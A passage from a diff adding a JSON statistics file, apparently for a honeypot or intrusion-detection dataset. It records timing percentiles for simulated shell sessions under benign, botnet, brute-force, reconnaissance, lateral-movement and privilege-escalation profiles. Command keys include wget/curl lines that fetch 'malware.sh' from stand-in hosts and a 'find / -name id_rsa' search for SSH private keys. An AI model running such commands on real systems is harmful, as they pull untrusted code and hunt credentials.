+        "max": 0.047
+      }
+    },
+    "wget http://files.example/malware.sh": {
+      "train": {
+        "n": 4,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "curl -O http://pkg-repo.example/b.sh": {
+      "train": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "curl -O http://pkg-repo.example/payload": {
+      "train": {
+        "n": 1,
+        "median": 0.062,
+        "max": 0.062
+      },
+      "validation": {
+        "n": 3,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "wget -q http://pkg-repo.example/malware.sh -O malware.sh": {
+      "train": {
+        "n": 2,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 2,
+        "median": 0.046,
+        "max": 0.047
+      }
+    },
+    "wget -q http://files.example/update.sh -O update.sh": {
+      "train": {
+        "n": 1,
+        "median": 0.047,
+        "max": 0.047
+      },
+      "validation": {
+        "n": 5,
+        "median": 0.047,
+        "max": 0.062
+      }
+    }
+  },
+  "splits": {
+    "train": {
+      "commands_sent": 7516,
+      "commands_with_wait_ge_5s": 30,
+      "slow_commands": {
+        "find / -name id_rsa 2>/dev/null": {
+          "n": 30,
+          "p5": 11.406,
+          "p25": 11.469,
+          "p50": 11.657,
+          "p75": 11.953,
+          "p95": 13.422,
+          "max": 13.531
+        }
+      },
+      "think_time_s_by_profile": {
+        "benign_admin": {
+          "n": 3049,
+          "p5": 0.437,
+          "p25": 0.889,
+          "p50": 1.453,
+          "p75": 2.449,
+          "p95": 5.129,
+          "max": 15.0
+        },
+        "botnet": {
+          "n": 1355,
+          "p5": 0.45,
+          "p25": 0.908,
+          "p50": 1.457,
+          "p75": 2.477,
+          "p95": 4.963,
+          "max": 15.0
+        },
+        "brute_force": {
+          "n": 99,
+          "p5": 0.582,
+          "p25": 1.031,
+          "p50": 1.582,
+          "p75": 2.731,
+          "p95": 4.777,
+          "max": 7.202
+        },
+        "lateral_movement": {
+          "n": 864,
+          "p5": 0.417,
+          "p25": 0.905,
+          "p50": 1.516,
+          "p75": 2.444,
+          "p95": 5.152,
+          "max": 14.235
+        },
+        "privilege_escalation": {
+          "n": 1022,
+          "p5": 0.419,
+          "p25": 0.894,
+          "p50": 1.527,
+          "p75": 2.486,
+          "p95": 5.422,
+          "max": 15.0
+        },
+        "reconnaissance": {
+          "n": 1127,
+          "p5": 0.445,
+          "p25": 0.89,
+          "p50": 1.529,
+          "p75": 2.555,
+          "p95": 5.267,
+          "max": 13.195
+        }
+      },
+      "execution_delay_s_by_profile": {
+        "benign_admin": {
+          "n": 3049,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.047,
+          "p95": 0.063,
+          "max": 0.141
+        },
+        "botnet": {
+          "n": 1355,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.063,
+          "max": 0.109
+        },
+        "brute_force": {
+          "n": 99,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.047,
+          "p95": 0.063,
+          "max": 0.078
+        },
+        "lateral_movement": {
+          "n": 864,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.063,
+          "max": 0.078
+        },
+        "privilege_escalation": {
+          "n": 1022,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.156,
+          "max": 13.531
+        },
+        "reconnaissance": {
+          "n": 1127,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.063,
+          "max": 0.078
+        }
+      },
+      "execution_delay_s_all_except_slow": {
+        "n": 7486,
+        "p5": 0.046,
+        "p25": 0.047,
+        "p50": 0.047,
+        "p75": 0.062,
+        "p95": 0.063,
+        "max": 0.282
+      },
+      "logged_in_sessions": 1500,
+      "per_profile": {
+        "benign_admin": {
+          "session_duration_s": {
+            "n": 561,
+            "p5": 6.2,
+            "p25": 9.5,
+            "p50": 12.3,
+            "p75": 15.8,
+            "p95": 23.3,
+            "max": 29.7
+          },
+          "time_to_first_input_s": {
+            "n": 561,
+            "p5": 0.523,
+            "p25": 1.019,
+            "p50": 1.634,
+            "p75": 2.656,
+            "p95": 5.724,
+            "max": 15.098
+          },
+          "inter_input_mean_s": {
+            "n": 561,
+            "p5": 0.959,
+            "p25": 1.412,
+            "p50": 1.807,
+            "p75": 2.358,
+            "p95": 3.759,
+            "max": 8.154
+          },
+          "inter_input_std_s": {
+            "n": 555,
+            "p5": 0.262,
+            "p25": 0.592,
+            "p50": 0.962,
+            "p75": 1.463,
+            "p95": 3.071,
+            "max": 6.147
+          },
+          "think_sum_s": {
+            "n": 561,
+            "p5": 4.476,
+            "p25": 7.287,
+            "p50": 9.909,
+            "p75": 13.335,
+            "p95": 20.217,
+            "max": 27.09
+          },
+          "exec_sum_s": {
+            "n": 561,
+            "p5": 0.157,
+            "p25": 0.234,
+            "p50": 0.281,
+            "p75": 0.327,
+            "p95": 0.39,
+            "max": 0.469
+          },
+          "n_cmds": {
+            "n": 561,
+            "p5": 3,
+            "p25": 4,
+            "p50": 6,
+            "p75": 6,
+            "p95": 7,
+            "max": 9
+          },
+          "share_with_slow_cmd": 0.0,
+          "share_with_find_id_rsa": 0.0,
+          "exec_share_of_duration_median": 0.022
+        },
+        "botnet": {
+          "session_duration_s": {
+            "n": 195,
+            "p5": 9.4,
+            "p25": 12.4,
+            "p50": 15.2,
+            "p75": 18.6,
+            "p95": 26.8,
+            "max": 35.3
+          },
+          "time_to_first_input_s": {
+            "n": 195,
+            "p5": 0.559,
+            "p25": 0.994,
+            "p50": 1.561,
+            "p75": 2.526,
+            "p95": 4.971,
+            "max": 13.652
+          },
+          "inter_input_mean_s": {
+            "n": 195,
+            "p5": 1.057,
+            "p25": 1.515,
+            "p50": 1.903,
+            "p75": 2.38,
+            "p95": 3.611,
+            "max": 5.155
+          },
+          "inter_input_std_s": {
+            "n": 195,
+            "p5": 0.302,
+            "p25": 0.73,
+            "p50": 1.057,
+            "p75": 1.532,
+            "p95": 2.979,
+            "max": 5.133
+          },
+          "think_sum_s": {
+            "n": 195,
+            "p5": 6.836,
+            "p25": 9.965,
+            "p50": 12.356,
+            "p75": 15.859,
+            "p95": 24.863,
+            "max": 30.908
+          },
+          "exec_sum_s": {
+            "n": 195,
+            "p5": 0.266,
+            "p25": 0.312,
+            "p50": 0.359,
+            "p75": 0.391,
+            "p95": 0.439,
+            "max": 0.486
+          },
+          "n_cmds": {
+            "n": 195,
+            "p5": 5,
+            "p25": 6,
+            "p50": 7,
+            "p75": 8,
+            "p95": 8,
+            "max": 9
+          },
+          "share_with_slow_cmd": 0.0,
+          "share_with_find_id_rsa": 0.0,
+          "exec_share_of_duration_median": 0.023
+        },
+        "brute_force": {
+          "session_duration_s": {
+            "n": 198,
+            "p5": 0.9,
+            "p25": 1.7,
+            "p50": 2.7,
+            "p75": 4.1,
+            "p95": 6.7,
+            "max": 11.0
+          },
+          "time_to_first_input_s": {
+            "n": 99,
+            "p5": 0.672,
+            "p25": 1.161,
+            "p50": 1.717,
+            "p75": 2.796,
+            "p95": 4.955,
+            "max": 7.24
+          },
+          "inter_input_mean_s": null,
+          "inter_input_std_s": null,
+          "think_sum_s": {
+            "n": 198,
+            "p5": 0,
+            "p25": 0,
+            "p50": 0,
+            "p75": 1.582,
+            "p95": 3.693,
+            "max": 7.202
+          },
+          "exec_sum_s": {
+            "n": 198,
+            "p5": 0,
+            "p25": 0,
+            "p50": 0,
+            "p75": 0.047,
+            "p95": 0.063,
+            "max": 0.078
+          },
+          "n_cmds": {
+            "n": 198,
+            "p5": 0,
+            "p25": 0,
+            "p50": 0,
+            "p75": 1,
+            "p95": 1,
+            "max": 1
+          },
+          "share_with_slow_cmd": 0.0,
+          "share_with_find_id_rsa": 0.0,
+          "exec_share_of_duration_median": 0.002
+        },
+        "lateral_movement": {
+          "session_duration_s": {
+            "n": 192,
+            "p5": 5.4,
+            "p25": 8.1,
+            "p50": 10.2,
+            "p75": 13.9,
+            "p95": 21.1,
+            "max": 26.7
+          },
+          "time_to_first_input_s": {
+            "n": 192,
+            "p5": 0.542,
+            "p25": 1.142,
+            "p50": 1.778,
+            "p75": 2.798,
+            "p95": 5.37,
+            "max": 9.365
+          },
+          "inter_input_mean_s": {
+            "n": 192,
+            "p5": 0.953,
+            "p25": 1.394,
+            "p50": 1.794,
+            "p75": 2.394,
+            "p95": 3.578,
+            "max": 5.71
+          },
+          "inter_input_std_s": {
+            "n": 188,
+            "p5": 0.089,
+            "p25": 0.499,
+            "p50": 0.825,
+            "p75": 1.495,
+            "p95": 2.584,
+            "max": 5.213
+          },
+          "think_sum_s": {
+            "n": 192,
+            "p5": 3.58,
+            "p25": 6.103,
+            "p50": 8.048,
+            "p75": 10.81,
+            "p95": 17.206,
+            "max": 23.71
+          },
+          "exec_sum_s": {
+            "n": 192,
+            "p5": 0.141,
+            "p25": 0.188,
+            "p50": 0.22,
+            "p75": 0.281,
+            "p95": 0.329,
+            "max": 0.406
+          },
+          "n_cmds": {
+            "n": 192,
+            "p5": 3,
+            "p25": 4,
+            "p50": 4,
+            "p75": 5,
+            "p95": 6,
+            "max": 7
+          },
+          "share_with_slow_cmd": 0.0,
+          "share_with_find_id_rsa": 0.0,
+          "exec_share_of_duration_median": 0.021
+        },
+        "privilege_escalation": {
+          "session_duration_s": {
+            "n": 175,
+            "p5": 7.5,
+            "p25": 11.5,
+            "p50": 14.6,
+            "p75": 20.3,
+            "p95": 30.2,
+            "max": 49.2
+          },
+          "time_to_first_input_s": {
+            "n": 175,
+            "p5": 0.549,
+            "p25": 1.235,
+            "p50": 1.798,
+            "p75": 3.029,
+            "p95": 6.334,
+            "max": 13.031
+          },
+          "inter_input_mean_s": {
+            "n": 175,
+            "p5": 0.985,
+            "p25": 1.513,
+            "p50": 1.992,
+            "p75": 2.767,
+            "p95": 4.59,
+            "max": 6.303
+          },
+          "inter_input_std_s": {
+            "n": 175,
+            "p5": 0.331,
+            "p25": 0.676,
+            "p50": 1.051,
+            "p75": 1.829,
+            "p95": 4.714,
+            "max": 8.489
+          },
+          "think_sum_s": {
+            "n": 175,
+            "p5": 5.241,
+            "p25": 8.761,
+            "p50": 10.73,
+            "p75": 14.39,
+            "p95": 21.147,
+            "max": 34.069
+          },
+          "exec_sum_s": {
+            "n": 175,
+            "p5": 0.203,
+            "p25": 0.295,
+            "p50": 0.344,
+            "p75": 0.454,
+            "p95": 12.156,
+            "max": 13.922
+          },
+          "n_cmds": {
+            "n": 175,
+            "p5": 4,
+            "p25": 5,
+            "p50": 6,
+            "p75": 7,
+            "p95": 8,
+            "max": 9
+          },
+          "share_with_slow_cmd": 0.171,
+          "share_with_find_id_rsa": 0.171,
+          "exec_share_of_duration_median": 0.027
+        },
+        "reconnaissance": {
+          "session_duration_s": {
+            "n": 179,
+            "p5": 7.0,
+            "p25": 11.6,
+            "p50": 14.3,
+            "p75": 18.0,
+            "p95": 24.0,
+            "max": 30.8
+          },
+          "time_to_first_input_s": {
+            "n": 179,
+            "p5": 0.533,
+            "p25": 0.937,
+            "p50": 1.566,
+            "p75": 2.387,
+            "p95": 5.25,
+            "max": 13.27
+          },
+          "inter_input_mean_s": {
+            "n": 179,
+            "p5": 1.131,
+            "p25": 1.497,
+            "p50": 1.916,
+            "p75": 2.473,
+            "p95": 3.51,
+            "max": 4.486
+          },
+          "inter_input_std_s": {
+            "n": 179,
+            "p5": 0.386,
+            "p25": 0.72,
+            "p50": 1.055,
+            "p75": 1.691,
+            "p95": 2.513,
+            "max": 4.868
+          },
+          "think_sum_s": {
+            "n": 179,
+            "p5": 5.252,
+            "p25": 9.04,
+            "p50": 12.231,
+            "p75": 15.157,
+            "p95": 21.19,
+            "max": 27.651
+          },
+          "exec_sum_s": {
+            "n": 179,
+            "p5": 0.204,
+            "p25": 0.266,
+            "p50": 0.326,
+            "p75": 0.361,
+            "p95": 0.436,
+            "max": 0.564
+          },
+          "n_cmds": {
+            "n": 179,
+            "p5": 4,
+            "p25": 5,
+            "p50": 6,
+            "p75": 7,
+            "p95": 9,
+            "max": 10
+          },
+          "share_with_slow_cmd": 0.0,
+          "share_with_find_id_rsa": 0.0,
+          "exec_share_of_duration_median": 0.022
+        }
+      },
+      "slow_command_sessions_by_profile": {
+        "benign_admin": 0,
+        "botnet": 0,
+        "brute_force": 0,
+        "lateral_movement": 0,
+        "privilege_escalation": 30,
+        "reconnaissance": 0
+      },
+      "non_pe_duration_quantiles": {
+        "n": 1325,
+        "p95": 23.6,
+        "p99": 28.5,
+        "max": 35.3
+      },
+      "sessions_above_non_pe_p95_by_profile": {
+        "benign_admin": 27,
+        "botnet": 25,
+        "brute_force": 0,
+        "lateral_movement": 3,
+        "privilege_escalation": 26,
+        "reconnaissance": 11
+      },
+      "pe_duration_with_find_id_rsa": {
+        "n": 30,
+        "p5": 17.7,
+        "p25": 22.9,
+        "p50": 25.6,
+        "p75": 30.2,
+        "p95": 41.9,
+        "max": 49.2
+      },
+      "pe_duration_without_find_id_rsa": {
+        "n": 145,
+        "p5": 7.0,
+        "p25": 11.1,
+        "p50": 13.3,
+        "p75": 17.0,
+        "p95": 23.2,
+        "max": 31.7
+      },
+      "pe_duration_minus_find_exec": {
+        "n": 30,
+        "p5": 5.793,
+        "p25": 11.322,
+        "p50": 13.797,
+        "p75": 18.247,
+        "p95": 28.369,
+        "max": 37.481
+      },
+      "duration_vs_components": {
+        "median_abs_residual_s": 1.732,
+        "note": "duration minus (sum think + sum execution); the residual is login, initial prompt, exit and connection overhead"
+      }
+    },
+    "validation": {
+      "commands_sent": 3079,
+      "commands_with_wait_ge_5s": 9,
+      "slow_commands": {
+        "find / -name id_rsa 2>/dev/null": {
+          "n": 9,
+          "p5": 11.359,
+          "p25": 11.406,
+          "p50": 11.578,
+          "p75": 11.781,
+          "p95": 12.11,
+          "max": 12.11
+        }
+      },
+      "think_time_s_by_profile": {
+        "benign_admin": {
+          "n": 1309,
+          "p5": 0.446,
+          "p25": 0.92,
+          "p50": 1.494,
+          "p75": 2.482,
+          "p95": 5.068,
+          "max": 15.0
+        },
+        "botnet": {
+          "n": 506,
+          "p5": 0.45,
+          "p25": 0.914,
+          "p50": 1.479,
+          "p75": 2.425,
+          "p95": 4.91,
+          "max": 14.334
+        },
+        "brute_force": {
+          "n": 38,
+          "p5": 0.391,
+          "p25": 0.964,
+          "p50": 1.429,
+          "p75": 2.656,
+          "p95": 5.988,
+          "max": 8.816
+        },
+        "lateral_movement": {
+          "n": 353,
+          "p5": 0.42,
+          "p25": 0.773,
+          "p50": 1.379,
+          "p75": 2.469,
+          "p95": 5.943,
+          "max": 15.0
+        },
+        "privilege_escalation": {
+          "n": 416,
+          "p5": 0.454,
+          "p25": 0.973,
+          "p50": 1.67,
+          "p75": 2.706,
+          "p95": 4.995,
+          "max": 9.338
+        },
+        "reconnaissance": {
+          "n": 457,
+          "p5": 0.393,
+          "p25": 0.9,
+          "p50": 1.48,
+          "p75": 2.499,
+          "p95": 5.083,
+          "max": 12.492
+        }
+      },
+      "execution_delay_s_by_profile": {
+        "benign_admin": {
+          "n": 1309,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.047,
+          "p95": 0.063,
+          "max": 0.11
+        },
+        "botnet": {
+          "n": 506,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.063,
+          "max": 0.078
+        },
+        "brute_force": {
+          "n": 38,
+          "p5": 0.047,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.063,
+          "max": 0.063
+        },
+        "lateral_movement": {
+          "n": 353,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.047,
+          "p95": 0.063,
+          "max": 0.156
+        },
+        "privilege_escalation": {
+          "n": 416,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.141,
+          "max": 12.11
+        },
+        "reconnaissance": {
+          "n": 457,
+          "p5": 0.046,
+          "p25": 0.047,
+          "p50": 0.047,
+          "p75": 0.062,
+          "p95": 0.063,
+          "max": 0.109
+        }
+      },
+      "execution_delay_s_all_except_slow": {
+        "n": 3070,
+        "p5": 0.046,
+        "p25": 0.047,
+        "p50": 0.047,
+        "p75": 0.062,
+        "p95": 0.063,
+        "max": 0.157
+      }
+    }
+  },
+  "slowest_commands": {
+    "find / -name id_rsa 2>/dev/null": {
+      "train": {
+        "n": 30,
+        "median": 11.665,
+        "max": 13.531
+      },
+      "validation": {
+        "n": 9,
+        "median": 11.578,
+        "max": 12.11
+      }
+    },
+    "ls -la /etc/cron.d": {
+      "train": {
+        "n": 32,
+        "median": 0.047,
+        "max": 0.282
+      },
+      "validation": {
+        "n": 13,
+        "median": 0.047,
+        "max": 0.062
+      }
+    },
+    "sudo -l": {
+      "train": {
+        "n": 95,
+        "median": 0.047,
+        "max": 0.203
+      },
+      "validation": {
+        "n": 41,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "ls -la /usr/bin | grep rws": {
+      "train": {
+        "n": 57,
+        "median": 0.156,
+        "max": 0.157
+      },
+      "validation": {
+        "n": 20,
+        "median": 0.148,
+        "max": 0.157
+      }
+    },
+    "cat /etc/hosts": {
+      "train": {
+        "n": 58,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 23,
+        "median": 0.047,
+        "max": 0.156
+      }
+    },
+    "who": {
+      "train": {
+        "n": 198,
+        "median": 0.047,
+        "max": 0.141
+      },
+      "validation": {
+        "n": 78,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "journalctl -n 20": {
+      "train": {
+        "n": 98,
+        "median": 0.047,
+        "max": 0.125
+      },
+      "validation": {
+        "n": 42,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "df -h": {
+      "train": {
+        "n": 217,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 88,
+        "median": 0.047,
+        "max": 0.11
+      }
+    },
+    "cat /etc/apt/sources.list": {
+      "train": {
+        "n": 89,
+        "median": 0.047,
+        "max": 0.11
+      },
+      "validation": {
+        "n": 35,
+        "median": 0.047,
+        "max": 0.094
+      }
+    },
+    "w": {
+      "train": {
+        "n": 351,
+        "median": 0.047,
+        "max": 0.109
+      },
+      "validation": {
+        "n": 157,
+        "median": 0.047,
+        "max": 0.109
+      }
+    },
+    "whoami": {
+      "train": {
+        "n": 156,
+        "median": 0.047,
+        "max": 0.078
+      },
+      "validation": {
+        "n": 72,
+        "median": 0.047,
+        "max": 0.109
+      }
+    },
+    "ping -c 2 192.0.2.5": {
+      "train": {
+        "n": 14,
+        "median": 0.054,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 8,
+        "median": 0.047,
+        "max": 0.109
+      }
+    },
+    "wget -q http://files.example/malware.sh -O malware.sh": {
+      "train": {
+        "n": 9,
+        "median": 0.047,
+        "max": 0.109
+      },
+      "validation": {
+        "n": 1,
+        "median": 0.047,
+        "max": 0.047
+      }
+    },
+    "ps aux": {
+      "train": {
+        "n": 225,
+        "median": 0.047,
+        "max": 0.094
+      },
+      "validation": {
+        "n": 103,
+        "median": 0.047,
+        "max": 0.063
+      }
+    },
+    "du -sh /var/log": {
+      "train": {
+        "n": 171,
+        "median": 0.047,
+        "max": 0.063
+      },
+      "validation": {
+        "n": 81,
+        "median": 0.047,
+        "max": 0.094
+      }
+    }
+  }
+}
